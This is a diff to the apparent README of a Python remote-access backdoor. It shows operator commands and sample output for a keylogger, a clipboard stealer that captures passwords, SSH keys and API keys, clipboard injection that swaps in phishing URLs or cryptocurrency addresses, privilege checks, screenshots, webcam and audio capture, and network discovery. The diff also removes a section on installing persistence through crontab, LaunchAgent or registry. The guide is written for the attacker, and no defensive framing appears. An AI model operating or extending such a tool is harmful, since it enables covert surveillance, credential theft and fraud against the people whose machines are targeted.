@@ -347,7 +347,7 @@ Release: 5.15.0
 
 ### Phase 5: Testing Features
 
-#### Quick Command Reference
+#### Command Reference
 
 **Screen & Media Capture:**
 | Command | Description | Example |
@@ -415,7 +415,7 @@ Release: 5.15.0
 help
 ```
 
-Response: Shows a list of all available commands and their descriptions
+Response: Shows a complete list of all available commands and their descriptions including basic commands, keylogger, privilege escalation, screen & media, network discovery, and clipboard features
 
 ```
 sysinfo
@@ -510,7 +510,7 @@ keylog_dump
 
 ```
 [*] Downloading keylog file...
-[+] Keylog file downloaded: keylog_dump_20251004_143022.txt
+[+] Keylog file downloaded: logs/keylog/keylog_dump_20251004_143022.txt
 
 === Keylog Content ===
 [2025-10-04 14:25:12] Hello World
@@ -519,7 +519,7 @@ keylog_dump
 === End of Keylog ===
 ```
 
-**Note:** The downloaded file is saved in the same directory where you run `server.py`
+**Note:** The downloaded file is saved in the `logs/keylog/` directory on the attacker machine
 
 ##### Stop Keylogger
 
@@ -568,7 +568,7 @@ Deletes the log file and clears the buffer
 **On Attacker Machine (after keylog_dump):**
 
 - File saved as: `keylog_dump_20251004_143022.txt`
-- Location: Same directory where `server.py` is running
+- Location: `logs/keylog/` directory on the attacker machine
 - Content: Identical to the target's log file with all timestamps preserved
 
 **File Management:**
@@ -577,211 +577,7 @@ Deletes the log file and clears the buffer
 - Old dumps are preserved (not overwritten)
 - Can be analyzed later or transferred securely
 
-#### Clipboard Stealer
-
-The clipboard stealer monitors and captures all text copied to the target's clipboard, providing a powerful way to steal passwords, sensitive data, and other information.
-
-```
-clipboard_start
-```
-
-Response: `[+] Clipboard monitoring started. Logging to: logs/clipboard/clipboard_20251004_150230.txt`
-
-##### How It Works
-
-###### Real-time Monitoring
-
-1. **Background Thread**: Runs continuously checking clipboard every 1 second
-2. **Change Detection**: Compares current clipboard with last known content
-3. **Automatic Logging**: When clipboard changes, logs timestamp and full content
-4. **Non-blocking**: Doesn't interfere with backdoor operations
-
-###### What Gets Captured
-
-- Passwords copied from password managers
-- Text copied from documents
-- URLs copied from browsers
-- Email addresses and usernames
-- API keys and tokens
-- Database credentials
-- SSH keys
-- Any text content copied by the user
-
-##### Check Status
-
-```
-clipboard_status
-```
-
-Shows:
-
-```json
-{
-  "running": true,
-  "log_file": "logs/clipboard/clipboard_20251004_150230.txt",
-  "check_interval": 1,
-  "pyperclip_available": true,
-  "last_content_length": 256,
-  "log_size_bytes": 2048
-}
-```
-
-##### Get Current Clipboard
-
-```
-clipboard_get
-```
-
-**Response:**
-
-```
-[+] Latest clipboard content (42 chars):
-This is some sensitive text from clipboard
-```
-
-This retrieves the current clipboard content without starting the monitor. Useful for:
-
-- Quick clipboard checks
-- Verifying what's currently copied
-- Testing clipboard access
-
-##### Set Clipboard (Injection Attack)
-
-```
-clipboard_set https://fake-login-page.com
-```
-
-**Response:**
-
-```
-[+] Clipboard set to: https://fake-login-page.com
-```
-
-**Attack Scenarios:**
-
-- Replace legitimate URLs with phishing links
-- Inject malicious commands the user might paste
-- Replace cryptocurrency addresses
-- Social engineering attacks
-
-**Example:**
-
-```
-# User copies: https://bank.com/login
-# You inject:
-clipboard_set https://fake-bank.com/phishing
-
-# When user pastes, they paste YOUR URL instead
-```
-
-##### View and Download Captured Clipboard Data
-
-```
-clipboard_dump
-```
-
-**What happens:**
-
-1. Retrieves the current clipboard log file from target
-2. Automatically downloads to attacker machine
-3. Saves as `clipboard_dump_YYYYMMDD_HHMMSS.txt` with timestamp
-4. Displays the content in the terminal
-
-**Output example:**
-
-```
-Clipboard log file ready: logs/clipboard/clipboard_20251004_150230.txt
-[*] Downloading clipboard log file...
-[+] Clipboard log file downloaded: clipboard_dump_20251004_150530.txt
-
-=== Clipboard Log Content ===
-============================================================
-Timestamp: 2024-10-04 15:03:45
-Length: 42 characters
-------------------------------------------------------------
-admin@company.com
-============================================================
-
-============================================================
-Timestamp: 2024-10-04 15:04:12
-Length: 23 characters
-------------------------------------------------------------
-MySecretPassword123!
-============================================================
-
-============================================================
-Timestamp: 2024-10-04 15:05:30
-Length: 256 characters
-------------------------------------------------------------
-Server: production-db.company.local
-Username: db_admin
-Password: Str0ngP@ssw0rd2024
-Port: 5432
-Database: production_data
-============================================================
-=== End of Clipboard Log ===
-```
-
-##### Stop Clipboard Monitoring
-
-```
-clipboard_stop
-```
-
-Response: `[+] Clipboard monitoring stopped`
-
-##### Clear Logs
-
-```
-clipboard_clear
-```
-
-Response: `[+] Clipboard logs cleared. New log file: logs/clipboard/clipboard_20251004_151045.txt`
-
-Deletes the current log file and creates a new empty one.
-
-##### List All Log Files
-
-```
-clipboard_list
-```
-
-Response:
-
-```
-[+] Clipboard log files:
-  - clipboard_20251004_150230.txt (2048 bytes)
-  - clipboard_20251004_145612.txt (1024 bytes)
-  - clipboard_20251004_143305.txt (512 bytes)
-```
-
-##### Platform Requirements
-
-**macOS:** Works natively (uses pbcopy/pbpaste)
-
-**Windows:** Works natively (pyperclip uses win32clipboard)
-
-**Linux:** Requires xclip or xsel
-
-```bash
-# Install on Ubuntu/Debian
-sudo apt-get install xclip
-
-# Install on Fedora/CentOS
-sudo dnf install xclip
-
-# Install on Arch
-sudo pacman -S xclip
-```
-
-##### Limitations
-
-1. **Text Only**: Only captures text content, not images or files
-2. **Timing**: May miss very rapid clipboard changes (< 1 second apart)
-3. **Platform**: Linux requires xclip/xsel installation
-4. **Detection**: Can be detected by security tools monitoring clipboard
-
-#### Test Privilege Escalation
+#### Privilege Escalation
 
 ```
 priv_check
@@ -815,7 +611,7 @@ Response: Lists important services and their status
 [+] Services: sshd (root), cups (user)
 ```
 
-#### Test Screen Capture
+#### Screen Capture
 
 ```
 screenshot_multi 5 2
@@ -879,7 +675,7 @@ Available screenshots:
 - screenshot_20241002_120000.png
 ```
 
-#### Test Screen Recording
+#### Screen Recording
 
 **Basic Timed Recording:**
 
@@ -1075,7 +871,7 @@ screen_recording_20251003_143000.mp4 (45.2 MB)
 - **Large file sizes**: Use lower FPS (10-15) or shorter duration
 - **Black screen**: Check screen recording permissions
 
-#### Test Webcam Capture
+#### Webcam Capture
 
 ```
 webcam_snap
@@ -1145,40 +941,211 @@ Available audio files:
 - audio_20241002_150030.wav
 ```
 
-#### Test Persistence
+#### Clipboard Stealer
+
+The clipboard stealer monitors and captures all text copied to the target's clipboard, providing a powerful way to steal passwords, sensitive data, and other information.
 
 ```
-persist_check
+clipboard_start
 ```
 
-Response: Shows if persistence is installed and method used
-
-```
-persist_install
-```
-
-Response: Installs persistence (e.g., crontab, LaunchAgent, registry)
-
-```
-persist_remove
-```
-
-Response: Removes persistence and cleans up
+Response: `[+] Clipboard monitoring started. Logging to: logs/clipboard/clipboard_20251004_150230.txt`
 
 ##### How It Works
 
-1. **Check**: Detects if persistence is active and which method is used
-2. **Install**: Adds the backdoor to system startup (crontab, LaunchAgent, registry, etc.)
-3. **Remove**: Deletes persistence entry and verifies removal
+###### Real-time Monitoring
 
-##### Output Example
+1. **Background Thread**: Runs continuously checking clipboard every 1 second
+2. **Change Detection**: Compares current clipboard with last known content
+3. **Automatic Logging**: When clipboard changes, logs timestamp and full content
+4. **Non-blocking**: Doesn't interfere with backdoor operations
+
+###### What Gets Captured
+
+- Passwords copied from password managers
+- Text copied from documents
+- URLs copied from browsers
+- Email addresses and usernames
+- API keys and tokens
+- Database credentials
+- SSH keys
+- Any text content copied by the user
+
+##### Check Status
 
 ```
-[+] Persistence installed: crontab @reboot
-[+] Persistence removed successfully
+clipboard_status
 ```
 
-#### Test Network Discovery
+Shows:
+
+```json
+{
+  "running": true,
+  "log_file": "logs/clipboard/clipboard_20251004_150230.txt",
+  "check_interval": 1,
+  "pyperclip_available": true,
+  "last_content_length": 256,
+  "log_size_bytes": 2048
+}
+```
+
+##### Get Current Clipboard
+
+```
+clipboard_get
+```
+
+**Response:**
+
+```
+[+] Latest clipboard content (42 chars):
+This is some sensitive text from clipboard
+```
+
+This retrieves the current clipboard content without starting the monitor. Useful for:
+
+- Quick clipboard checks
+- Verifying what's currently copied
+- Testing clipboard access
+
+##### Set Clipboard (Injection Attack)
+
+```
+clipboard_set https://fake-login-page.com
+```
+
+**Response:**
+
+```
+[+] Clipboard set to: https://fake-login-page.com
+```
+
+**Attack Scenarios:**
+
+- Replace legitimate URLs with phishing links
+- Inject malicious commands the user might paste
+- Replace cryptocurrency addresses
+- Social engineering attacks
+
+**Example:**
+
+```
+# User copies: https://bank.com/login
+# You inject:
+clipboard_set https://fake-bank.com/phishing
+
+# When user pastes, they paste YOUR URL instead
+```
+
+##### View and Download Captured Clipboard Data
+
+```
+clipboard_dump
+```
+
+**What happens:**
+
+1. Retrieves the current clipboard log file from target
+2. Automatically downloads to attacker machine
+3. Saves as `clipboard_dump_YYYYMMDD_HHMMSS.txt` with timestamp
+4. Displays the content in the terminal
+
+**Output example:**
+
+```
+Clipboard log file ready: logs/clipboard/clipboard_20251004_150230.txt
+[*] Downloading clipboard log file...
+[+] Clipboard log file downloaded: logs/clipboard/clipboard_dump_20251004_150530.txt
+
+=== Clipboard Log Content ===
+============================================================
+Timestamp: 2024-10-04 15:03:45
+Length: 42 characters
+------------------------------------------------------------
+admin@company.com
+============================================================
+
+============================================================
+Timestamp: 2024-10-04 15:04:12
+Length: 23 characters
+------------------------------------------------------------
+MySecretPassword123!
+============================================================
+
+============================================================
+Timestamp: 2024-10-04 15:05:30
+Length: 256 characters
+------------------------------------------------------------
+Server: production-db.company.local
+Username: db_admin
+Password: Str0ngP@ssw0rd2024
+Port: 5432
+Database: production_data
+============================================================
+=== End of Clipboard Log ===
+```
+
+##### Stop Clipboard Monitoring
+
+```
+clipboard_stop
+```
+
+Response: `[+] Clipboard monitoring stopped`
+
+##### Clear Logs
+
+```
+clipboard_clear
+```
+
+Response: `[+] Clipboard logs cleared. New log file: logs/clipboard/clipboard_20251004_151045.txt`
+
+Deletes the current log file and creates a new empty one.
+
+##### List All Log Files
+
+```
+clipboard_list
+```
+
+Response:
+
+```
+[+] Clipboard log files:
+  - clipboard_20251004_150230.txt (2048 bytes)
+  - clipboard_20251004_145612.txt (1024 bytes)
+  - clipboard_20251004_143305.txt (512 bytes)
+```
+
+##### Platform Requirements
+
+**macOS:** Works natively (uses pbcopy/pbpaste)
+
+**Windows:** Works natively (pyperclip uses win32clipboard)
+
+**Linux:** Requires xclip or xsel
+
+```bash
+# Install on Ubuntu/Debian
+sudo apt-get install xclip
+
+# Install on Fedora/CentOS
+sudo dnf install xclip
+
+# Install on Arch
+sudo pacman -S xclip
+```
+
+##### Limitations
+
+1. **Text Only**: Only captures text content, not images or files
+2. **Timing**: May miss very rapid clipboard changes (< 1 second apart)
+3. **Platform**: Linux requires xclip/xsel installation
+4. **Detection**: Can be detected by security tools monitoring clipboard
+
+#### Network Discovery
 
 ```
 net_info
